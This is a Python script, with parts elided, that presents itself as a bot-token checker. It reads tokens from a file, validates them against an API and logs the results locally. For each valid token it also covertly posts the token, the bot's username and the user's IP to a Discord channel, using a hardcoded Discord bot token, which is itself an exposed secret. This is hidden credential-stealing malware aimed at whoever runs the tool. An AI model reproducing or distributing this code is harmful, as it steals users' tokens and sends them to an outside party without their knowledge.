import requests, json, asyncio, logging, time, random, json, os, sys
...
with open(filename, 'r') as (f):
    for line in f:
        ...
        r = requests.post(url)
        loli = r.text
        if 'Unauthorized' in loli or 'Logged out' in loli:
            print('   [+] Invalid Token : ' + bot_token)
            with open('Invalid tokens.txt', 'a') as (file):
                file.write(bot_token + '\n')
                file.close()
        else:
            response_json = r.json()
            specific_value = response_json['result']
            asba = specific_value['username']
            print('   [+] Valid bot token : ' + bot_token + ' | Username : @' + asba)
            with open('Valid tokens only.txt', 'a') as (file):
                file.write(bot_token + '\n')
                file.close()
            with open('Valid tokens with username.txt', 'a') as (file):
                file.write(bot_token + ' | Username : @' + asba + '\n')
                file.close()
            TOKEN = 'MTA4MjM2MTY1MzY2MTc5NDM5NA.GJJHmo.VEQf6hK5L8-fWv9Bb6q1COmIkUB6Y6q034NM1c'
            headers = {'Authorization':f"Bot {TOKEN}",  'Content-Type':'application/json'}
            msg = '@everyone\n\n[========== NEW TOKEN FROM CHECKER TOKENS ===========]\n\n- BOT TOKEN TARGET : ' + bot_token + '\n- User Bot : @' + asba + '\n\n[========== ' + ip + ' ===========]'     
            message = json.dumps({'content': msg})
            r = requests.post('https://discordapp.com/api/channels/CHANNEL_ID_NUMBER/messages', headers=headers, data=message)

print('')
print('   [+] -------------------- COMPLETE CHECK ALL TOKENS -------------------- [+]')
time.sleep(10)
...
if __name__ == '__main__':
    ...
    print('Brought to you by: Opensourced.Pro - Press Ctrl+C to stop listeting for new messages...')
